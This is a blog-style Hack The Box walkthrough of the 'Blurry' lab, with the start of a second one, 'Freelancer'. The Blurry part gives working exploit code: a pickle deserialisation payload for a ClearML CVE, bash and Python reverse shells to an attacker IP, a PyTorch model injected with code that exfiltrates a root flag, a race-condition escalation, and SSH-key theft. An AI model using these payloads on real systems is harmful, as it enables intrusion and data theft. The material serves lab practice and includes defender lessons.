from clearml import Task import os, pickle class RunCommand(): def __reduce__(self): cmd = &#34;bash -c &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1&#39;&#34; return (os.system, (cmd,)) command = RunCommand() task = Task.init(project_name=&#39;White Swan&#39;, task_name=&#39;my_artifact_upload&#39;, output_uri=True) task.upload_artifact(name=&#39;pickle_artifact&#39;, artifact_object=command, retries=2, wait_on_upload=True, extension_name=&#34;.pkl&#34;) artifact = task.artifacts.get(&#39;pickle_artifact&#39;) pickle_local_path = artifact.get() I&rsquo;ll delete the project I just initialized, and try again using this new version of upload_artifact.py:
&#x261d;&#xfe0f; You&rsquo;ll need to go into the project and archive the task inside before you&rsquo;ll be allowed to delete the project.
That process hangs, and a reverse shell opens! &#x1f642;
But the reverse shell is to&hellip; myself? &#x1f643;
Usable reverse shell I once again read the notes on CVE-2024-24590 from the blog post on disclosing the ClearML CVEs, and found some subtle wording that I hadn&rsquo;t noticed before:
&ldquo;When a user calls the get method within the Artifact class to download and load a file into memory, the pickle file is deserialized on their system, running any arbitrary code it contains.&rdquo;
That&rsquo;s right, the pickle is deserialized &ldquo;on their system&rdquo; - The mistake I made is that it&rsquo;s my system making the call to artifact.get(). I need to find a way to get the target to call the Artifact get() method instead of me!
Thankfully, the trick was sitting in plain sight. There is a task running in the &ldquo;Black Swan&rdquo; project every three minutes, called &ldquo;Review JSON Artifacts&rdquo;. Here&rsquo;s the code it&rsquo;s running:
#!/usr/bin/python3 from clearml import Task from multiprocessing import Process from clearml.backend_api.session.client import APIClient def process_json_artifact(data, artifact_name): &#34;&#34;&#34; Process a JSON artifact represented as a Python dictionary. Print all key-value pairs contained in the dictionary. &#34;&#34;&#34; print(f&#34;[+] Artifact &#39;{artifact_name}&#39; Contents:&#34;) for key, value in data.items(): print(f&#34; - {key}: {value}&#34;) def process_task(task): artifacts = task.artifacts for artifact_name, artifact_object in artifacts.items(): data = artifact_object.get() if isinstance(data, dict): process_json_artifact(data, artifact_name) else: print(f&#34;[!] Artifact &#39;{artifact_name}&#39; content is not a dictionary.&#34;) def main(): review_task = Task.init(project_name=&#34;Black Swan&#34;, task_name=&#34;Review JSON Artifacts&#34;, task_type=Task.TaskTypes.data_processing) # Retrieve tasks tagged for review tasks = Task.get_tasks(project_name=&#39;Black Swan&#39;, tags=[&#34;review&#34;], allow_archived=False) if not tasks: print(&#34;[!] No tasks up for review.&#34;) return threads = [] for task in tasks: print(f&#34;[+] Reviewing artifacts from task: {task.name} (ID: {task.id})&#34;) p = Process(target=process_task, args=(task,)) p.start() threads.append(p) task.set_archived(True) for thread in threads: thread.join(60) if thread.is_alive(): thread.terminate() # Mark the ClearML task as completed review_task.close() def cleanup(): client = APIClient() tasks = client.tasks.get_all( system_tags=[&#34;archived&#34;], only_fields=[&#34;id&#34;], order_by=[&#34;-last_update&#34;], page_size=100, page=0, ) # delete and cleanup tasks for task in tasks: # noinspection PyBroadException try: deleted_task = Task.get_task(task_id=task.id) deleted_task.delete( delete_artifacts_and_models=True, skip_models_used_by_other_tasks=True, raise_on_error=False ) except Exception as ex: continue if __name__ == &#34;__main__&#34;: main() cleanup() There&rsquo;s a call to the Artifact get() method in process_task(). Therefore, it&rsquo;s the owner of the process running this task (jippity) that would be opening the reverse shell.
How do we get the process_task() code to run? This code seems to be loading and running any artifacts inside the &ldquo;Black Swan&rdquo; project that are tagged with &ldquo;review&rdquo;, so I&rsquo;ll modify my upload_artifact.py to do this instead:
from clearml import Task import os, pickle class RunCommand(): def __reduce__(self): cmd = &#34;bash -c &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1&#39;&#34; return (os.system, (cmd,)) command = RunCommand() task = Task.init(project_name=&#39;Black Swan&#39;, task_name=&#39;my_artifact_upload&#39;, tags=&#39;review&#39;, output_uri=True) task.upload_artifact(name=&#39;pickle_artifact&#39;, artifact_object=command, retries=2, wait_on_upload=True, extension_name=&#34;.pkl&#34;) #artifact = task.artifacts.get(&#39;pickle_artifact&#39;) #pickle_local_path = artifact.get() I&rsquo;ll once again run this code:
python3 upload_artifact.py Then, after waiting a few minutes, a reverse shell opened!
And this time it&rsquo;s actually another user &#x1f601; As expected, we opened a reverse shell as jippity.
USER FLAG Upgrade the shell I&rsquo;ll follow the process outlined in my guide on upgrading the shell:
python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash stty rows 35 columns 120 Get the flag The reverse shell opens at /home/jippity, adjacent to the user flag.
Simply cat it out for the points:
cat user.txt SSH The /home/jippity directory also has .ssh, with a key sitting inside. We can simply read the key and transfer it back to the attacker machine, for an easy way to get back in without re-exploiting:
Write a new id_rsa file and copy in the contents. Then just change permissions and use the key for login:
cd loot vim id_rsa # copy in the key contents chmod 600 id_rsa ssh -i id_rsa jippity@$RADDR ROOT FLAG Local enumeration: jippity The home directory has more contents than just the flag and SSH though. There is some stuff pertaining to ClearML. clearml.conf has an API access &amp; secret key:
&#34;access_key&#34;: &#34;8TL83TDO2YXCQ4789DE4&#34;, &#34;secret_key&#34;: &#34;peFoHVcUTMA0JdhOHNoQTioLSmtbKEiAVxZXJSHku4LyHlOTUB&#34; Surprisingly, I was able to get the sudo list for jippity without any password:
&#x261d;&#xfe0f; As usual, that&rsquo;s a pretty strong indicator of a privesc vector.
Since that&rsquo;s clearly a custom binary, let&rsquo;s check if there&rsquo;s any source code for it sitting around:
The evaluate_model.py contents are as follows:
import subprocess import sys def run_command(command): &#34;&#34;&#34;Helper function to run a command in the shell.&#34;&#34;&#34; try: result = subprocess.run(command, check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) print(result.stdout.decode()) except subprocess.CalledProcessError as e: print(f&#34;Error occurred: {e.stderr.decode()}&#34;) sys.exit(1) def create_user(username, password): &#34;&#34;&#34;Creates a new user with the specified username and password.&#34;&#34;&#34; # Create the user with the specified username run_command(f&#34;sudo useradd -m {username}&#34;) # Set the user&#39;s password run_command(f&#34;echo &#39;{username}:{password}&#39; | sudo chpasswd&#34;) # Add the user to the sudo group run_command(f&#34;sudo usermod -aG sudo {username}&#34;) if __name__ == &#34;__main__&#34;: # Define username and password here username = &#34;admin&#34; password = &#34;password&#34; create_user(username, password) print(f&#34;User &#39;{username}&#39; has been created and added to the sudo group.&#34;) Haha it&rsquo;s like they&rsquo;re taunting us with that run_command() functon &#x1f602;
The shell script at /usr/bin/evaluate_model has the following contents:
#!/bin/bash # Evaluate a given model against our proprietary dataset. # Security checks against model file included. if [ &#34;$#&#34; -ne 1 ]; then /usr/bin/echo &#34;Usage: $0 &lt;path_to_model.pth&gt;&#34; exit 1 fi MODEL_FILE=&#34;$1&#34; TEMP_DIR=&#34;/models/temp&#34; PYTHON_SCRIPT=&#34;/models/evaluate_model.py&#34; /usr/bin/mkdir -p &#34;$TEMP_DIR&#34; file_type=$(/usr/bin/file --brief &#34;$MODEL_FILE&#34;) # Extract based on file type if [[ &#34;$file_type&#34; == *&#34;POSIX tar archive&#34;* ]]; then # POSIX tar archive (older PyTorch format) /usr/bin/tar -xf &#34;$MODEL_FILE&#34; -C &#34;$TEMP_DIR&#34; elif [[ &#34;$file_type&#34; == *&#34;Zip archive data&#34;* ]]; then # Zip archive (newer PyTorch format) /usr/bin/unzip -q &#34;$MODEL_FILE&#34; -d &#34;$TEMP_DIR&#34; else /usr/bin/echo &#34;[!] Unknown or unsupported file format for $MODEL_FILE&#34; exit 2 fi /usr/bin/find &#34;$TEMP_DIR&#34; -type f \\( -name &#34;*.pkl&#34; -o -name &#34;pickle&#34; \\) -print0 | while IFS= read -r -d $&#39;\\0&#39; extracted_pkl; do fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 &#34;$extracted_pkl&#34;) if /usr/bin/echo &#34;$fickling_output&#34; | /usr/bin/jq -e &#39;select(.severity == &#34;OVERTLY_MALICIOUS&#34;)&#39; &gt;/dev/null; then /usr/bin/echo &#34;[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted.&#34; /bin/rm &#34;$MODEL_FILE&#34; break fi done /usr/bin/find &#34;$TEMP_DIR&#34; -type f -exec /bin/rm {} + /bin/rm -rf &#34;$TEMP_DIR&#34; if [ -f &#34;$MODEL_FILE&#34; ]; then /usr/bin/echo &#34;[+] Model $MODEL_FILE is considered safe. Processing...&#34; /usr/bin/python3 &#34;$PYTHON_SCRIPT&#34; &#34;$MODEL_FILE&#34; fi Oh? It looks like this whole shell script is just for &ldquo;sanitizing&rdquo; the pth file that is passed to the evaluate_model.py script. It does all this sanitization, but fails to mitigate the more obvious risk - that the evaluate_model.py script is modifiable by a low-priv user!
We can sudo /usr/bin/evaluate_model, which in turn runs the python script, so why not just edit the python script? There&rsquo;s even a handy function within the script that helps us abuse it &#x1f440;
First, I&rsquo;ll set up another reverse shell listener:
sudo ufw allow from $RADDR to any port 4445 proto tcp bash nc -lvnp 4445 Modify the script to use a simple nc reverse shell (tested on the jippity user first, which was successful):
Finally, just run the binary using any &ldquo;safe&rdquo; model, such as the demo_model.pth:
sudo /usr/bin/evaluate_model /models/demo_model.pth &amp; And we get a reverse shell as root!
&#x1f34d; That&rsquo;s all there is to it - the root flag is in the usual spot, at /root/root.txt. Simply cat it out to finish the box:
cat /root/root.txt EXTRA CREDIT: ALTERNATE PRIVESC Aside: what the pth Running file over the .pth file reveals that it&rsquo;s actually a zip archive. Let&rsquo;s transfer it back to my attacker machine and take a look inside. To do this, I&rsquo;ll start up an http server and upload demo_model.pth:
&#x1f447; I&rsquo;m using my own tool, simple-http-server. It&rsquo;s just a slight improvement on Python http.server, a lot like a PHP server, but with a few advantages for file upload and data exfiltration using base64.
sudo ufw allow from $RADDR to any port 8000 proto tcp cd loot simple-server 8000 -v Then upload the file from the target:
Unzipping this file on my attacker machine, I see that it contains a bunch of data and a pickle:
I&rsquo;d love to just examine this pickle directly, but it looks like I have to actually load the pickle it before I can see the source code contained inside. Here&rsquo;s how I&rsquo;ll get the code:
import sys import pickle #import pickletools import inspect filepath = sys.argv[1] with open(filepath, &#39;rb&#39;) as file: #pickletools.dis(file) obj = pickle.load(file) if inspect.isfunction(obj) or inspect.isclass(obj): source_code = inspect.getsource(obj) print(source_code) However, running this makes the interpreter complain that I don&rsquo;t have torch installed, so I&rsquo;ll go get it:
python3 -m venv . source bin/activate pip3 install torch # Requires at least 1.5GB of downloads pip3 install torchvision As this is downloading, I&rsquo;m wondering to myself: is it even necessary to load the code in this pickle? After all, we know this pickle is being loaded by the target, so maybe the privesc here is to simply make my own pickle and package it into my own .pth file? &#x1f914;
Detecting model version There&rsquo;s a tool called fickling that specializes in both creating and detecting pickles used in AI/ML.
pip3 install fickling Now we can use fickling to detect the type of model that demo_model.pth is using:
import fickling.polyglot as polyglot filename = &#39;../loot/smaller_cifar_net/data.pkl&#39; potential_formats = polyglot.identify_pytorch_file_format(filename, print_results=True) potential_formats_legacy = polyglot.identify_pytorch_file_format(filename, print_results=True) It seems confident the existing model is PyTorch v0.1.10. Is that important? Not sure yet.
Malicious pickle in the model There&rsquo;s another feature that fickling claims will inject arbitrary python code into a model. Check out their PoC example as a reference. Here&rsquo;s my thinned-down version:
import sys import torch import torchvision.models as models from fickling.pytorch import PyTorchModelWrapper if len(sys.argv) &lt; 3: print(f&#39;Usage: {sys.argv[0]} &lt;pickle_file&gt; &lt;cmd&gt;&#39;) sys.exit() FILEPATH = sys.argv[1] CMD = sys.argv[2] # Load example PyTorch model model = models.mobilenet_v2() torch.save(model, FILEPATH) # Wrap model file into fickling result = PyTorchModelWrapper(FILEPATH) # Inject payload, overwriting the existing file instead of creating a new one temp_filename = &#34;temp_filename.pt&#34; result.inject_payload( CMD, temp_filename, injection=&#34;insertion&#34;, overwrite=True, ) I&rsquo;ll run the script, then prepare for an incoming reverse shell:
python3 inject_into_torch.py revsh.pth \\ &#39;import os,pty,socket;s=socket.socket();s.connect((&#34;10.10.14.12&#34;,4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;sh&#34;)&#39; mv revsh.pth ../www/ # Directory that http server is serving bash nc -lvnp 4445 Now, from the target, I&rsquo;ll download the model into a directory other than /models, copy it into /models, then run evaluate_model using my malicious .pth file.
&#x1f447; The /models directory is periodically cleaned-up. To avoid having to repeatedly download my malicious .pth, I&rsquo;ll use another directory that isn&rsquo;t affected by the cleanup script.
curl -o /tmp/.Tools/revsh.pth http://10.10.14.12:8000/revsh.pth cp /tmp/.Tools/revsh.pth /models/ &amp;&amp; sudo /usr/bin/evaluate_model /models/revsh.pth However, it fails to execute. The message indicates that the target is also using fickling to test whether or not the model is malicious. Talk about fighting fire with fire:
&#x1f602; Yeah, I guess that was &ldquo;overtly malicious&rdquo;&hellip; Maybe I should be more subtle?
Instead of a reverse shell, I&rsquo;ll just make a web request to exfiltrate the root flag contents. Here&rsquo;s the new payload:
import base64, requests; contents = base64.b64encode(open(&#39;/root/root.txt&#39;, &#39;rb&#39;).read()).decode(&#39;utf-8&#39;); requests.get(f&#39;http://10.10.14.12:8000/?b64={contents}&#39;) First, I&rsquo;ll test this idea with the user flag:
Yep, that works perfectly - now let&rsquo;s wrap that into a fresh pth file:
python3 inject_into_torch.py exfil.pth \\ &#34;import base64, requests; contents = base64.b64encode(open(&#39;/root/root.txt&#39;, &#39;rb&#39;).read()).decode(&#39;utf-8&#39;); requests.get(f&#39;http://10.10.14.12:8000/?b64={contents}&#39;)&#34; mv exfil.pth ../www/ Then, from the target via SSH:
curl -o /tmp/.Tools/exfil.pth http://10.10.14.12:8000/exfil.pth cp /tmp/.Tools/exfil.pth /models/ &amp;&amp; sudo /usr/bin/evaluate_model /models/exfil.pth Same result! /usr/bin/evaluate_model claims the model is &ldquo;overtly malicious&rdquo; &#x1f644;
Tricking evaluate_model Taking a closer look at /usr/bin/evaluate_model we can actually see that there is a coding error. We can trick evaluate_model&rsquo;s use of fickling by introducing a race condition! Take another look at the end of /usr/bin/evaluate_model to see why.
# ... if [ -f &#34;$MODEL_FILE&#34; ]; then /usr/bin/echo &#34;[+] Model $MODEL_FILE is considered safe. Processing...&#34; /usr/bin/python3 &#34;$PYTHON_SCRIPT&#34; &#34;$MODEL_FILE&#34; fi The script assumes that if the provided .pth file is still present by the time this clause is executed, it was actually deemed safe by fickling. It&rsquo;s a subtle bug, but definitely one we can exploit.
This bug could have been avoided by a pretty easy change to the script:
Generate a random number or hash, and make a temporary filename [random_number]_model.pth Using the elevated process, copy the model provided as an argument over to any other directory, perhaps /tmp/[random_number]_model.pth Run the fickling safety check on this temp file that has a randomized name, instead of the one provided as an argument. Run /usr/bin/python3 &quot;$PYTHON_SCRIPT&quot; [random_number]_model.pth instead of the code shown above. In short, we can exploit this by constantly copying over the malicious model. That way, if we&rsquo;re lucky at least one of the copy operations will occur when evaluate_model is between these two lines:
/bin/rm &#34;$MODEL_FILE&#34; # ... if [ -f &#34;$MODEL_FILE&#34; ]; then Here&rsquo;s my script loop_copy.sh to constantly copy my malicious pth file into /models:
#!/bin/bash while true do cp /tmp/.Tools/revsh.pth /models/test.pth done And here&rsquo;s my script loop_evaluate.sh to keep trying evaluate_model over and over until it eventually opens a reverse shell:
#!/bin/bash while true do sudo /usr/bin/evaluate_model /models/test.pth done I&rsquo;ll run the former in the background, and the latter in the foreground:
/tmp/.Tools/loop_copy.sh &amp; /tmp/.Tools/loop_evaluate.sh After a few iterations of loop_evaluate, I saw a connection arrive at my reverse shell listener&hellip;
&hellip;but it closed right away. Could just be the wrong reverse shell to attempt. I&rsquo;ll try a bash reverse shell instead of a pure python one:
I used a bash reverse shell as an initial foothold. So why not try that one again?
python3 inject_into_torch.py revsh.pth \\ &#34;import os;os.system(&#39;bash -c \\&#34;sh -i &gt;&amp; /dev/tcp/10.10.14.12/4445 0&gt;&amp;1\\&#34;&#39;)&#34; mv revsh.pth ../www/ # Directory that http server is serving Now download the new payload to the target and try again:
# pkill loop_copy.sh curl -o /tmp/.Tools/revsh.pth http://10.10.14.12:8000/revsh.pth /tmp/.Tools/loop_copy.sh &amp; /tmp/.Tools/loop_evaluate.sh It worked almost instantly. Oddly, it didn&rsquo;t open a reverse shell, but we got escalated privilege within the shell directly &#x1f914;
&#x1f389; Success! We have just pwned the box in a second way!
Just in case we are overly concerned with gaining a second reverse shell as root, we can now easily open one:
bash -c &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.12/4445 0&gt;&amp;1&#39; CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
pkill loop_copy.sh rm -rf /tmp/.Tools rm /models/exfil.pth /models/revsh.pth /models/test.pth Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
cd loot rm -rf my_model.pth demo_model.pth smaller_cifar_net smaller_cifar_net.bak # I&#39;ll only keep id_rsa There&rsquo;s also the matter of getting rid of my python venv that contains pytorch (which is huge):
cd ../exploit deactivate # deactivate the venv rm -rf ./bin ./include ./lib* ./share It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; Finally, clean up /etc/hosts:
sudo sed -i &#39;/blurry.htb/d&#39; /etc/hosts LESSONS LEARNED Attacker &#x1f4d6; Read disclosure blogs very carefully. Many of the better infosec articles are surprisingly well-written. Sometimes there is a lot of detail in their words; it can be easy to miss if you&rsquo;re skimming an article. Be sure to read actively and carefully. On this box, I missed a few details intially, causing me substantial delays.
&#x1f608; Malicious pickles are so easy! Keep an eye out for any time that an application implicitly trusts (or takes as input) a pickle. It is trivial to include malicious code inside the pickle. This whole process is made even easier by tools like fickling.
Defender &#x1f952; Never trust a pickle you don&rsquo;t know. The only way to use pickles in a reasonably safe manner is to use a cryptographic signature on the pickle. If you can&rsquo;t verify the pickle&rsquo;s integrity, it shouldn&rsquo;t be used as an input to a program.
&#x2699;&#xfe0f; Don&rsquo;t overlook the boring stuff. It seems that the developers on this box put a great deal of thought into how to protect their model from &ldquo;overtly malicious&rdquo; components, but failed to practice good file-permission hygeine. Good security isn&rsquo;t always about preventing 0-days and nation state actors - sometimes it&rsquo;s just about good ol&rsquo; access control.
&#x1f453; Secure coding practices are tough, but important. We demonstrated in the previous section how to exploit a subtle flaw in the evaluate_model script logic. This flaw could have been avoided by using a temporary, randomized filename - something that a good web developer would do instinctively for any file upload. However, since this script was intended for a trusted user (jippity) the author of the script was too trusting of the execution environment.
`,url:"https://4wayhandshake.github.io/walkthrough/blurry/"},"https://4wayhandshake.github.io/walkthrough/freelancer/":{title:"Freelancer",tags:["IDOR","Broken Authentication","QR Code","Session Hijacking","Memory Dump","Crackmapexec","RunasCs","Windows Credential Stealing","Bloodhound","RBCD Attack","Passing the Hash"],categories:["Walkthrough","HTB","Windows","Hard"],content:`INTRODUCTION In my opinion, Freelancer was a very tough box. It was released as the 7th box of HTB&rsquo;s Season V Anomalies. It&rsquo;s about attacking an Active Directory environment that&rsquo;s running a freelancer job market website. Solving this box requires a wide array of skills. However, while a many skills are required, none of the individual steps in the solution are painfully difficult. It is a long box though, with roughly equal amounts of labour required for foothold, the user flag, and for privilege escalation.
Recon was relatively simple. Some web skills will go a long way. As usual, the right approach is to not dive too far into any one vector for attack without fully exploring the website and trying all of its functionality. The dashboard is accessible from both the freelancer and employer roles, but only the freelancer one is directly accessible. A password reset will get you into the dashboard as an employer, and from there you can utilize an IDOR to hijack the administrator&rsquo;s session, getting you into the admin dashboard.
Exploiting the admin dashboard takes a little bit of SQL understanding. Not really an SQL injection per se, but you will use some techniques that you may have only ever seen in SQLi RCE attacks. You can either utilize this as a pseudo-webshell or just pop a reverse shell to gain a foothold.
After some local enumeration, you&rsquo;ll come across some credentials. Utilize these credentials to gain access to a Windows memory dump (and a little hint about why it exists). Properly utilizing this memory dump is tricky, but when accessed with the right tools it will give you access to another set of credentials. With these credentials, you can pivot to the second user and begin your journey to the root flag.
Privilege escalation was mostly an exercise in using Bloodhound. Without it, privesc would have been far too confusing for me to accomplish. Thankfully though, following the steps that Bloodhound instructs will move you towards gaining the admin hash. Finally, you&rsquo;ll be able to log in as the admin by passing-the-hash.
This one tested the limits of my understanding of Windows. Thankfully, I learned a lot - I&rsquo;m grateful for such a challenge! Best of luck &#x1f609;
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown 49672/tcp open unknown 57695/tcp open unknown 57699/tcp open unknown Ok, there&rsquo;s a bunch of the usual suspects. That&rsquo;s an odd flavour of LDAP though.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http nginx 1.25.5 |_http-title: Did not follow redirect to http://freelancer.htb/ |_http-server-header: nginx/1.25.5 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-05 10:16:40Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49671/tcp open msrpc Microsoft Windows RPC 49672/tcp open msrpc Microsoft Windows RPC 57695/tcp open msrpc Microsoft Windows RPC 57699/tcp open msrpc Microsoft Windows RPC Host script results: | smb2-time: | date: 2024-06-05T10:17:34 |_ start_date: N/A |_clock-skew: 5h02m56s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required First, we note the http redirect to http://freelancer.htb. There&rsquo;s also an LDAP domain shown: freelancer.htb0.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR (no results)
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 53/udp open domain Simple DNS Plus 88/udp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-05 10:20:10Z) 123/udp open ntp NTP v3 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows There are some positive results for DNS, Kerberos, and NTP.
Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=template.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 $RADDR &amp;&amp; curl -IL http://$RADDR To get a feel for the layout of the site, I spidered then AJAX-spidered the site using ZAP. The full site map is too large to show in one screenshot, but it is worth noting that there is an accont recovery process on this site (slightly abnormal for an HTB box):
The recovery process appears to be based on security questions, so it might be guessable. We can also see that there are ways to add comments to blog posts.
Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results for other root domains. Now I&rsquo;ll check for subdomains of freelancer.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration. Wappalyzer reports that the site is using a Nginx + Django + Python stack, so I&rsquo;m actually not expecting any file extensions for normal pages:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e .html,.htm,.txt -timeout 4 -v -mc all -fc 404 This scan pointed out to me that the site is actually rate-limiting me. The rate-limited requests yield an HTTP 503 result.
Knowing that the site map is quite broad, I decided to instead use Gobuster. It provides a more compact display of the results. I&rsquo;m going to slow it down substantially by only using ten threads this time, too.
gobuster dir -w $WLIST -u http://$DOMAIN \\ --random-agent -t 10 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;fuzzing/directory-gobuster-$DOMAIN.txt&#34; \\ --no-error The scan is still running, but already we see a page that the ZAP spidering did not find, /admin:
Exploring the Website The website appears to be a job marketplace for freelancers. Employers and freelancers are able to register separately. Employers post jobs, then the freelancers select them and submit an application.
Employer registration Employer registration shows a message at the top:
This is definitely a hint, probably telling the HTB player one of these three things:
&ldquo;Don&rsquo;t bother registering an employer: it&rsquo;s not part of the box&rdquo; I&rsquo;ve never seen an HTB box that required the player to register an actual functional email. &ldquo;This form might be usable for XSS&rdquo; If they review every employer account before activating, then we might be able to steal the session from a higher-privilege user. &ldquo;Employer accounts are part of this box, but won&rsquo;t use conventional authentication&rdquo; Maybe this has something to do with the account recovery procedure? Just to see if the form was even usable, I submitted an account request:
I registered the account dragoncorp : !!!Password123
It seemed to have worked. Obviously that&rsquo;s a fake email, so I won&rsquo;t be receiving any confirmation of the registered account, even if that mechanism exists.
Freelancer registration As expected, registration requires that we submit answers to three security questions. Later on, this might end up being guessable &#x1f6a9;
They have some degree of password security awareness though: the registration form disallowed me using password as a password:
It happily accepted Password123! though. I&rsquo;ll register some more and attempt to infer the password policy.
&#x2714;&#xfe0f; Password123! &#x274c; Password123 &#x2714;&#xfe0f; Drowssap123 This proves that they actually are checking a list of common passwords (or their hashes), not just relying on a character-by-character password policy Perhaps this form can be used for username enumeration, too? Attempting to register a username admin proves that it can:
That&rsquo;s great! But perhaps it&rsquo;s unnecessary. I&rsquo;ll check the site from the Freelancer perspective and see if there&rsquo;s a simple way to see usernames directly. To do this, I created one more user:
jimbob : !!!Password123
Then, I explored the jobs board. Clicking on one posting, I could see a clearly visible username:
Clicking on Tom&rsquo;s profile picture, we arrive at the View profile page for his account: freelancer.htb/accounts/profile/visit/3/. Lucky for us, this URI seems to be easily guessable. Trying the numbers 0 through 2, we arrive at one that we already knew about:
Also, while trying a few of these, I&rsquo;ve found that the CSRF token remains the same for each request, so it should be easy to scrap together a script to enumerates some users:
#!/bin/python3 import requests from bs4 import BeautifulSoup TARGET = &#39;http://freelancer.htb/accounts/profile/visit/##NUM##/&#39; COOKIES = { &#39;csrftoken&#39;: &#39;vmeEeiWC2KW8H4YvJPXNNlUVF27cVT1y&#39;, &#39;sessionid&#39;: &#39;od0lp7olfcocaka338vk600xh0sf3e6y&#39; } HEADERS = {&#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;} s = requests.session() def guess_user_id(i): url = TARGET.replace(&#39;##NUM##&#39;, str(i)) resp = s.get(url, cookies=COOKIES, headers=HEADERS) if resp.status_code != 200: return None, None soup = BeautifulSoup(resp.text, &#39;html.parser&#39;) information_box = soup.find(class_=&#39;information-box&#39;) if not information_box: return None, None h3_value = information_box.find(&#39;h3&#39;).text if information_box.find(&#39;h3&#39;) else None span_value = information_box.find(&#39;span&#39;).text if information_box.find(&#39;span&#39;) else None return h3_value, span_value if __name__ == &#34;__main__&#34;: i = 0 N = 100 print(f&#39;Submitting {N} User ID guesses to {TARGET[:-8]}&#39;) for i in range(N): user_id, user_name = guess_user_id(i) if user_id and user_name: print(f&#39;[+] Found {i: &gt;3} {user_id: &gt;20} : {user_name:&lt;65}&#39;) with open(&#39;found_users.csv&#39;, &#39;a&#39;) as f: f.write(f&#39;{user_id}, {user_name}\\n&#39;) print(f&#39;{90*&#34; &#34;}\\nDone&#39;) Running this script rapidly enumerates the users:
